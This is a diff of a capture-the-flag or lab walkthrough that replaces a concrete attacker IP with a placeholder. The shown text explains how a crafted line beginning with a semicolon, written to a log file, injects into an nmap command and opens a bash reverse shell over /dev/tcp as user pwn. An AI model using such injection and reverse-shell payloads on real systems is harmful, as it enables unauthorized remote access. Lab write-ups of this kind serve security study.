@@ -140,13 +140,13 @@ Maybe we can take advantage of that running command to run a command of our own 
 After some crafting, we have a string that we can put in the `logs/hackers` file:
 
 ```
-  ;  /bin/bash -c "bash -i >& /dev/tcp/10.10.14.6/4442 0>&1" #
+  ;  /bin/bash -c "bash -i >& /dev/tcp/10.10.x.x/4442 0>&1" #
 ```
 
 The space in front is for the `cut -d ' ' -f3-` command because it will grab the string after 2 spaces. This will force the executed command to be like this:
 
 ```
-sh -c "nmap --top-ports 10 -oN recon/; /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.6/4442 0>&1' # rest of command here"
+sh -c "nmap --top-ports 10 -oN recon/; /bin/bash -c 'bash -i >& /dev/tcp/10.10.x.x/4442 0>&1' # rest of command here"
 ```
 
 which will force a bash shell to open as `pwn`.
